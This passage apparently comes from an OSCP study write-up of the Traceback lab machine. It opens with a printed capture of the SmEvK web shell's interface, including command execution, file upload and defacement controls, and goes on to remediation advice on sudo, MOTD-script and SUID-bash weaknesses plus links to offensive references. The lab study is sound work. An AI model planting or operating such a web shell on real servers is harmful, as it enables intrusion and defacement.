onclick="g('Injector',null,'','','')">Code Injector</a></th><th><a href="#" onclick="g('Domain',null,'','','')">Domains</a></th><th><a href="#" onclick="g('Logout',null,'','','')">Logout</a></th></tr></table></div></div><div style="margin:5;background:black;"><h1>File manager</h1><div class=content><script>
        function sa() {
            for(i=0;i<document.files.elements.length;i++)
            if(document.files.elements[i].type == 'checkbox')
                document.files.elements[i].checked = document.files.elements[0].checked;
        }
        </script>
        <table width='100%' class='main' cellspacing='0' cellpadding='2'>
        <form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/var/www/html/..');"><b>[ .. ]</b></a></td><td>dir</td><td>2021-04-22 06:08:27</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxr-xr-x</b></font></td><td><a href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="bg.jpg" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'bg.jpg', 'view')">bg.jpg</a></td><td>528.97 KB</td><td>2019-07-31 04:50:58</td><td>root/webadmin</td><td><a href=# onclick="g('FilesTools',null,'bg.jpg','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a href="#" onclick="g('FilesTools',null,'bg.jpg', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'bg.jpg', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'bg.jpg', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'bg.jpg', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="index.html" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'index.html', 'view')">index.html</a></td><td>1.09 KB</td><td>2019-08-27 04:29:44</td><td>root/webadmin</td><td><a href=# onclick="g('FilesTools',null,'index.html','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a href="#" onclick="g('FilesTools',null,'index.html', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="smevk.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'smevk.php', 'view')">smevk.php</a></td><td>102.62 KB</td><td>2020-02-27 05:37:01</td><td>root/webadmin</td><td><a href=# onclick="g('FilesTools',null,'smevk.php','chmod')"><font color=white><b>-r--r--r--</b></font></td><td><a href="#" onclick="g('FilesTools',null,'smevk.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'smevk.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'smevk.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'smevk.php', 'download')">D</a></td></tr><tr><td colspan=5>
    <input type=hidden name=a value='FilesMan'>
    <input type=hidden name=c value="/var/www/html/">
    <input type=hidden name=charset value="UTF-8">
    <select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option></select>&nbsp;<input type="submit" value=">>"></td><td colspan="2" align="right" width="1"><input name="def" id="def" value="index.php" size="10"/>&nbsp;<input type="button" onclick="g('FilesMan','/var/www/html/','deface',document.getElementById('def').value)" value="Add your Deface"></td></tr>
    </form></table></div></div><div style="margin:5px;background:black;"><div class="content" style="border:1px solid ; border-radius:5px;">
<table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%">
    <tr>
        <td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="/var/www/html/"><input type=submit value=">>"></form></td>
        <td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
    </tr>
    <tr>
        <td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
        <td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
    </tr>
    <tr>
        <td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
        <td><form method="post" ENCTYPE="multipart/form-data">
        <input type=hidden name=a value="FilesMAn">
        <input type=hidden name=c value="/var/www/html/">
        <input type=hidden name=p1 value="uploadFile">
        <input type=hidden name=charset value="UTF-8">
        <span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
    </tr>
</table></div></div>
<div style="margin:5px;background:black;"><div class="content" style="border:2px solid ;text-align:center;font-weight:bold; border-radius:10px;margin:auto; width:500;">SmEvK_PaThAn Shell v3 coded by <a href="https://www.facebook.com/smevkpathan"> Kashif Khan</a></div></div>
</div>
</body></html>
```

## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Attacker-left web shell | Remove the backdoor, investigate how it was placed, and restrict the web root to authorised application files. |
| Default SmEvK credentials | Never deploy a web shell; if one is required for an approved maintenance process, use unique strong credentials and restrict access by network and authentication controls. |
| Sudo to Luvit | Remove the rule. If a specific maintenance action is required, allow a root-owned wrapper with fixed arguments and no user-controlled interpreter input. |
| Group-writable MOTD scripts | Make `/etc/update-motd.d` scripts root-owned and non-writable by unprivileged groups. Audit every script executed during SSH login. |
| SUID Bash | Do not create SUID interpreters. Remove `/tmp/rootbash` and audit the filesystem for unexpected SUID files. |
| SSH key management | Remove stale keys from `authorized_keys`, restrict file permissions, and review login history for unexpected keys. |

## Lessons learned and vault links

- Attacker clues and exposed PHP shells: [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- Web-shell command execution and URL encoding: [[OSCP/RUNBOOK V2/Linux - Command Injection]]
- PTY recovery: [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- Manual Linux enumeration: [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- Sudo run-as transitions and interpreter abuse: [[OSCP/RUNBOOK V2/Linux - Sudo Check]]
- SUID Bash and effective UID: [[OSCP/RUNBOOK V2/Linux - SUID Check]]
- Cleanup and `boxdone`: [[OSCP/RUNBOOK V2/Linux - Clean Down]]
- Related theory: [[OSCP/MODULES/09. Common Web Application Attacks|Module 9 — Common Web Application Attacks]] and [[OSCP/MODULES/18. Linux Privilege Escalation|Module 18 — Linux Privilege Escalation]]

## External resources

- [HackTricks — Linux privilege escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [GTFOBins](https://gtfobins.github.io/) — sudo, interpreters, pagers, and SUID escapes
- [PayloadsAllTheThings — Linux privilege escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) — callback payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) — quoting and encoding checks
- [ippsec.rocks](https://ippsec.rocks/) — search `Traceback`, `web shell`, `sudo`, or `SUID`

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Command Injection]]
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Sudo Check]]
- [[OSCP/RUNBOOK V2/Linux - SUID Check]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Traceback rewards disciplined reading. The homepage's comment, the exact sudo rule, the interpreter's inline-evaluation option, and the group bits on a login-triggered script are all small clues. The box is a reminder to read configuration and permissions as an execution chain rather than treating each result as an isolated fact.
